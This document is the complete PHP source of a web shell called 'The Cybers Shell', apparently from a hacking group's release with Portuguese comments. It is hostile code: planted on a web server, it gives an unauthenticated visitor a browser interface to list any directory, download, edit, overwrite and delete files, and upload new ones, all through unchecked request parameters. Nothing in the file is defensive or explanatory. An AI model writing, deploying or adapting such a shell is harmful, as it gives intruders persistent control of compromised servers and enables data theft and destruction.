<!DOCTYPE html>
<html>
<head>
	<title>The Cybers Shell [beta 0.5]</title>

	<style>

		tr{
			background-color:red;
		}
		body, h1 a{
			background-color:black;
			color:#05ff05;
			text-decoration: none;
		}
		th,td{
			background-color:#111;
			text-align: left;
			width:200px;
		}
		.upar{
			background-color:#111;
			width:305px;
			padding:5px;
			margin-top:10px;
		}
		a{
			color:red;
		}
	</style>
</head>
<body>
<small>[Beta 0.5] www.fb.com/TheCybersTeam</small>
<h1><a href="shell.php" title='Home'>The Cybers Shell</a></h1>

<?php
/*
	By: The Cybers Team
	Versão: Beta 0.5
	[ok] listar
	[no] visualizar
	[ok] download
	[ok] editar
	[ok] deletar

*/
	// Configuração ==================================================
	if(!$diretorio = $_GET['ls']){
		$diretorio = getcwd();
	}

	// Funções =======================================================

	function anterior($dir){
		$dir = explode("/",$dir);
		unset($dir[count($dir)-1]);
		if($dir[1] == ""){
			$dir[0] = "/";
		}
		return implode("/",$dir);
	}
	function listar($dir){
		$anterior = anterior($dir);
		echo "
			<table>
				<tr>
					<th>Arquivo</th>
					<th>Tamanho</th>
					<th>Abrir</th>
					<th>Download</th>
					<th>Editar</th>
					<th>Excluir</th>
				</tr>
		";
		foreach(scandir($dir) as $nome){
			$file = "$dir/$nome";
			if($nome ==".."){
				echo "<tr>";
				echo "<td><a href=?ls=$anterior>..</a></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "</tr>";	
			}
			if(!is_file($file) and $nome != ".." and $nome != "."){
				echo "<tr>";
				echo "<td><a href=?ls=$file>$nome</a></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "<td></td>";
				echo "</tr>";
			}
			if($nome != "." && $nome !=".." && is_file($file)){
				echo "<tr>";	
				echo "<td>".$nome."</td>";
				echo "<td>".filesize($file)." bytes</td>";
				echo "<td><a href='#'>Visualizar</a></td>";
				echo "<td><a href='?download=$file'>Download</a></td>";
				echo "<td><a href='?editar=$file'>Editar</a></td>";
				echo "<td><a href='?deletar=$file'>Deletar</a></td>";
				echo "</tr>";
			}
		}
		echo "</table>";
	}

	function download($arquivo){
	    header('Content-Type: application/octet-stream');
	    header('Content-Length: '.filesize($arquivo));
	    header('Content-Disposition: filename='.$arquivo);
	    readfile($arquivo);
	    exit();
	}

	function editar($editar){
		echo "<form action=shell.php method=post>";
		$arq = file($editar);
		echo "<input name=arquivo type=hidden value='$editar'>";
		echo "<textarea name=salvar cols=100 rows=10>";
		foreach($arq as $linha){
			echo htmlspecialchars($linha);
		}
		echo "</textarea>";
		echo "<br />";
		echo "<input type=submit value=salvar>";
		echo "</form>";
		exit();
	}

	function salvar($dados, $arquivo){
		$fp = fopen($arquivo, "w");
		fwrite($fp,$dados);
		fclose($fp);
	}

	function deletar($arquivo){
		unlink($arquivo);
	}

	function upar($diretorio){
		echo "
		<form class=upar enctype='multipart/form-data' action='shell.php' method='post'>
			<input type='file' name='upload'/>
			<input type='hidden' diretorio='$diretorio'/>
			<input type='submit' value='Upar!'/>
		</form>";

	}

	function upload($arquivo, $diretorio){
		if(move_uploaded_file($arquivo['tmp_name'],"$diretorio/$arquivo[name]")){
			echo "Upado com sucesso! :D";
		}
	}

	// POST e GET ==================================================
	if($salvar = $_POST['salvar'] and $arquivo = $_POST['arquivo']){
		salvar($salvar,$arquivo);
	}
	if($arquivo = $_GET['download']){
		download($arquivo);
	}

	if($editar = $_GET['editar']){
		editar($editar);
	}

	if($deletar = $_GET['deletar']){
		deletar($deletar);
	}

	if($upar = $_FILES['upload']){
		upload($upar, $diretorio);
	}

	// Shell =======================================================
	listar($diretorio);
	upar($diretorio);


	?>
</body>
</html>
